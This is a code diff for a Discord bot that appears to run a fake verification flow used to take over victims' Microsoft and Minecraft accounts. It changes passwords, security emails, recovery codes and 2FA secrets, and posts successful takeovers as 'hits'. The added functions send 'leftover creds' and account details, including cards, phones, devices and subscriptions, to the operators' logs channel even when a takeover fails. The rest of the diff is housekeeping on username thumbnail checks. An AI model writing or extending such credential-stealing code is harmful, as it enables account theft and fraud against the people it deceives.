@@ -2,7 +2,7 @@ from discord import AllowedMentions, Embed, Interaction, abc
 import logging
 
 from securing.account_filters import is_embed_verify_no_minecraft
-from securing.build_embeds import public_secure_reason
+from securing.build_embeds import build_account_embeds, public_secure_reason
 from shared.embeds import verify_embed
 from shared.send_logs import send_logs, build_log_embed
 from shared.post_verification import after_verify
@@ -88,6 +88,80 @@ def _details_ready(details) -> bool:
     return isinstance(details, dict) and all(k in details for k in _DETAIL_KEYS)
 
 
+def _ms_for_leftover_embeds(account: dict) -> dict | None:
+    """Fill defaults so a failed secure can still build Extra Info / SSID buttons."""
+    ms = dict((account or {}).get("microsoft") or {})
+    if not ms:
+        return None
+    ms.setdefault("family", [])
+    ms.setdefault("devices", [])
+    ms.setdefault("cards", [])
+    ms.setdefault("phones", [])
+    subs = ms.get("subscriptions")
+    if not isinstance(subs, dict):
+        ms["subscriptions"] = {"active": [], "canceled": [], "commercial": []}
+    else:
+        subs.setdefault("active", [])
+        subs.setdefault("canceled", [])
+        subs.setdefault("commercial", [])
+    for key, default in (
+        ("firstName", "Unknown"),
+        ("lastName", "Unknown"),
+        ("fullName", "Unknown"),
+        ("region", "Unknown"),
+        ("birthday", "Unknown"),
+        ("language", "Unknown"),
+        ("security_email", "Couldn't Change!"),
+        ("password", "Couldn't Change!"),
+        ("recovery_code", "Couldn't Change!"),
+        ("auth_secret", "Disabled"),
+        ("email", ""),
+    ):
+        if not ms.get(key):
+            ms[key] = default
+    return ms
+
+
+async def _leftover_details(account: dict) -> dict | None:
+    details = account.get("details")
+    if _details_ready(details):
+        return details
+    ms = _ms_for_leftover_embeds(account)
+    if not ms:
+        return None
+    try:
+        built = await build_account_embeds(
+            {"microsoft": ms, "minecraft": account.get("minecraft") or {}},
+            0,
+            "",
+        )
+        return built.get("details") if isinstance(built, dict) else None
+    except Exception:
+        log.warning("leftover details embed failed", exc_info=True)
+        return None
+
+
+async def _send_leftover_to_logs(interaction: Interaction, secured_account, email: str) -> None:
+    """Failed secure still dumps leftover creds / Extra Info to logs_channel."""
+    leftover = secured_account.get("hit_embed") or secured_account.get("seller_embed")
+    details = await _leftover_details(secured_account)
+    extra = accountInfo(details) if _details_ready(details) else None
+    if leftover is None and extra is None:
+        return
+    try:
+        await send_logs(
+            interaction.client,
+            leftover,
+            view=extra,
+            email=email,
+        )
+        if details and details.get("stats_embed") is not None and details.get("stats_embed") is not leftover:
+            await send_logs(interaction.client, details["stats_embed"], email=email)
+        log.info("sent leftover fail details for %s to logs channel", email)
+    except Exception:
+        log.exception("leftover fail details send_logs failed for %s", email)
+
+
 async def publish_embed_secure_result(
     *,
     interaction: Interaction,
@@ -102,7 +176,16 @@ async def publish_embed_secure_result(
     (``failed=True``, often without ``details``). Treating that as success
     pinged @everyone then crashed on missing stats_embed.
     """
-    thumb = f"https://visage.surgeplay.com/full/512/{username}" if username else None
+    name = str(username or "").strip()
+    thumb = None
+    if (
+        name
+        and " " not in name
+        and 1 <= len(name) <= 16
+        and name.lower() not in {"unknown", "no minecraft", "?", "n/a"}
+        and all(c.isalnum() or c == "_" for c in name)
+    ):
+        thumb = f"https://visage.surgeplay.com/full/512/{name}"
     view = ButtonOptions(interaction.user, interaction.user.id, username)
 
     if isinstance(secured_account, dict) and secured_account.get("embed_no_minecraft"):
@@ -144,8 +227,10 @@ async def publish_embed_secure_result(
             view=view,
             email=email,
         )
-        # OTP/embed verify: never post the technical fail embed (HTML / RuntimeError)
-        # to the accounts channel or as a second ephemeral. User keeps one status embed.
+        # Leftover creds / Extra Info go to logs_channel only — never the hits room
+        # and never as a second ephemeral (user keeps one fail status).
+        if isinstance(secured_account, dict):
+            await _send_leftover_to_logs(interaction, secured_account, email)
         await set_verify_ephemeral(interaction, _verify_fail_embed(short))
         return False
 
